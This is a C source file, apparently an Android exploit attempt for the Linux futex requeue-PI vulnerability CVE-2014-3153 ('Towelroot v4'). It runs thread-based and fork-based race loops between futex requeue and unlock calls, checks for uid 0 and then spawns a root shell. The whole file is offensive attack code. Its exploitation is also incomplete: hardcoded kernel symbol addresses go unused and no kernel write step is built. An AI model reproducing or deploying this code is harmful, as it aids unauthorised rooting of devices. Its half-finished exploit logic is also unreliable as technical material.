/*
 * towelroot4.c — Tight-loop race exploit for CVE-2014-3153
 *
 * Strategy: Run the requeue + unlock in a tight race loop.
 * The vulnerability requires FUTEX_CMP_REQUEUE_PI and FUTEX_UNLOCK_PI
 * to execute concurrently on the same PI futex. When they race, the
 * waiter removal and wakeup can overlap, leaving pi_state inconsistent.
 *
 * The actual exploit path:
 * 1. Thread W: FUTEX_WAIT_REQUEUE_PI on futex1 → futex2
 * 2. Main: CMP_REQUEUE_PI (wake 1 sacrificial, requeue W to futex2)
 * 3. Thread U: FUTEX_UNLOCK_PI on futex2 (races with step 2)
 * 4. If race hits: W's fixup_owner() finds inconsistent state
 *    → pi_state leak → can get kernel write primitive
 *
 * Alternatively: Thread W gets woken with wrong ownership:
 * 1. W wakes up thinking it owns futex2
 * 2. But futex2 was already relocked by someone else
 * 3. fixup_pi_state_owner() runs with stale data
 * 4. This can corrupt the pi_state linked list → arbitrary write
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <time.h>
#include <linux/futex.h>

#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0

/* Shared futex variables */
static int *fmem;
#define F1 (&fmem[0])
#define F2 (&fmem[16])

static volatile int go = 0;
static volatile int done = 0;
static volatile int race_count = 0;
static volatile int anomaly_count = 0;

static struct timespec abs_mono(int ms) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_nsec += (long)ms * 1000000L;
    while (ts.tv_nsec >= 1000000000L) {
        ts.tv_sec++;
        ts.tv_nsec -= 1000000000L;
    }
    return ts;
}

/* ========== Worker threads ========== */

/* Sacrificial waiter: gets woken by CMP_REQUEUE_PI (val=1) */
static void *sac_worker(void *arg) {
    while (!done) {
        while (!go && !done) { __asm__ volatile("yield"); }
        if (done) break;

        struct timespec ts = abs_mono(5000);
        int ret = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0,
                          &ts, F2, 0);
        if (ret == 0) {
            /* Woken as PI owner — unlock */
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        }
    }
    return NULL;
}

/* Victim waiter: gets requeued, races with unlock */
static void *vic_worker(void *arg) {
    while (!done) {
        while (!go && !done) { __asm__ volatile("yield"); }
        if (done) break;

        struct timespec ts = abs_mono(5000);
        int ret = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0,
                          &ts, F2, 0);
        int err = errno;

        if (ret == 0) {
            /* Woken as PI owner — check if we got root! */
            if (getuid() == 0) {
                printf("\n[!!!] VICTIM GOT ROOT!\n");
                done = 1;
                /* Don't unlock — keep the root */
                return (void*)1;
            }
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        } else if (err != 110 /* ETIMEDOUT */ && err != 11 /* EAGAIN */) {
            /* Unexpected error — might be the race! */
            __sync_fetch_and_add(&anomaly_count, 1);
        }
    }
    return NULL;
}

/* Unlocker: rapidly unlocks F2 to race with requeue */
static void *unlocker(void *arg) {
    while (!done) {
        /* Tight loop: try to unlock F2 */
        syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        
        /* Also try locking and immediately unlocking to create contention */
        struct timespec ts = { .tv_sec = 0, .tv_nsec = 0 };
        int ret = syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, &ts, NULL, 0);
        if (ret == 0) {
            syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        }
        
        if (getuid() == 0) {
            printf("\n[!!!] UNLOCKER GOT ROOT!\n");
            done = 1;
            return (void*)1;
        }
    }
    return NULL;
}

static int tight_race_loop(int iterations) {
    printf("\n=== Tight Race Loop (%d iterations) ===\n", iterations);

    done = 0;
    race_count = 0;
    anomaly_count = 0;

    /* Start persistent worker threads */
    pthread_t sac_tid, vic_tid, unlock_tid;

    for (int i = 0; i < iterations && !done; i++) {
        *F1 = 0;
        *F2 = 0;
        go = 0;

        /* Lock F2 */
        syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

        /* Start fresh threads each iteration for clean stack state */
        pthread_create(&sac_tid, NULL, sac_worker, NULL);
        pthread_create(&vic_tid, NULL, vic_worker, NULL);

        /* Wait for threads to be ready */
        usleep(5000); /* 5ms */
        go = 1;
        usleep(5000); /* 5ms for threads to enter wait */

        /* Start unlocker SIMULTANEOUSLY with requeue */
        pthread_create(&unlock_tid, NULL, unlocker, NULL);

        /* Requeue — this races with the unlocker */
        int ret = syscall(SYS_futex, F1, FUTEX_CMP_REQUEUE_PI,
                          1, (void*)1, F2, 0);

        if (ret >= 2) {
            race_count++;
        }

        /* Brief wait then clean up */
        usleep(10000);
        done = 1; /* signal threads to exit */

        /* Wake any waiting threads */
        syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        syscall(SYS_futex, F2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);

        struct timespec jts;
        void *vres = NULL;
        
        clock_gettime(CLOCK_REALTIME, &jts); jts.tv_sec += 2;
        if (pthread_timedjoin_np(sac_tid, NULL, &jts) != 0) {
            pthread_cancel(sac_tid); pthread_join(sac_tid, NULL);
        }
        clock_gettime(CLOCK_REALTIME, &jts); jts.tv_sec += 2;
        if (pthread_timedjoin_np(vic_tid, &vres, &jts) != 0) {
            pthread_cancel(vic_tid); pthread_join(vic_tid, NULL);
        }
        clock_gettime(CLOCK_REALTIME, &jts); jts.tv_sec += 2;
        if (pthread_timedjoin_np(unlock_tid, NULL, &jts) != 0) {
            pthread_cancel(unlock_tid); pthread_join(unlock_tid, NULL);
        }

        /* Check for root */
        if (getuid() == 0 || vres == (void*)1) {
            printf("[!!!] ROOT at iteration %d!\n", i);
            return 1;
        }

        done = 0; /* reset for next iteration */

        if (i % 100 == 99) {
            printf("[*] Iteration %d: %d races, %d anomalies, uid=%d\n",
                   i + 1, race_count, anomaly_count, getuid());
        }
    }

    printf("[*] Completed: %d races, %d anomalies\n", race_count, anomaly_count);
    return 0;
}

/* ========== Alternate: fork-based concurrent race ========== */
static int fork_race(int iterations) {
    printf("\n=== Fork Race (%d iterations) ===\n", iterations);

    for (int i = 0; i < iterations; i++) {
        *F1 = 0;
        *F2 = 0;

        /* Lock F2 */
        syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

        /* Fork 2 waiters */
        pid_t sac = fork();
        if (sac == 0) {
            struct timespec ts = abs_mono(3000);
            int r = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, F2, 0);
            if (r == 0) syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            _exit(0);
        }

        pid_t vic = fork();
        if (vic == 0) {
            struct timespec ts = abs_mono(3000);
            int r = syscall(SYS_futex, F1, FUTEX_WAIT_REQUEUE_PI, 0, &ts, F2, 0);
            if (r == 0) {
                if (getuid() == 0) {
                    /* Write a signal file */
                    int fd = open("/data/local/tmp/.root_flag", O_CREAT|O_WRONLY, 0666);
                    if (fd >= 0) { write(fd, "ROOT", 4); close(fd); }
                }
                syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            }
            _exit(0);
        }

        usleep(10000); /* Let both enter wait */

        /* Race: requeue AND unlock simultaneously */
        pid_t racer = fork();
        if (racer == 0) {
            /* Child: rapidly try to unlock/relock F2 */
            for (int j = 0; j < 1000; j++) {
                syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
                syscall(SYS_futex, F2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
            }
            _exit(0);
        }

        /* Parent: requeue */
        int ret = syscall(SYS_futex, F1, FUTEX_CMP_REQUEUE_PI,
                          1, (void*)1, F2, 0);

        /* Wait for everything */
        usleep(50000);
        kill(racer, SIGKILL);
        syscall(SYS_futex, F2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        syscall(SYS_futex, F1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);

        int status;
        waitpid(sac, &status, 0);
        waitpid(vic, &status, 0);
        waitpid(racer, &status, 0);

        /* Check for root flag */
        if (access("/data/local/tmp/.root_flag", F_OK) == 0) {
            printf("[!!!] ROOT FLAG FOUND at iteration %d!\n", i);
            unlink("/data/local/tmp/.root_flag");
            return 1;
        }

        if (getuid() == 0) {
            printf("[!!!] PARENT GOT ROOT at iteration %d!\n", i);
            return 1;
        }

        if (i % 50 == 49) {
            printf("[*] Fork iteration %d complete\n", i + 1);
        }
    }
    return 0;
}

int main(void) {
    printf("=== Towelroot v4 — Tight Race CVE-2014-3153 ===\n");
    printf("[*] pid=%d uid=%d\n", getpid(), getuid());

    fmem = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    /* Try thread-based tight race (500 iterations) */
    if (tight_race_loop(500)) {
        printf("[!!!] ROOT via tight race!\n");
        execl("/system/bin/sh", "sh", NULL);
    }

    /* Try fork-based race (200 iterations) */
    if (fork_race(200)) {
        printf("[!!!] ROOT via fork race!\n");
        execl("/system/bin/sh", "sh", NULL);
    }

    printf("\n[*] Final uid=%d\n", getuid());

    munmap(fmem, 4096);
    return 0;
}
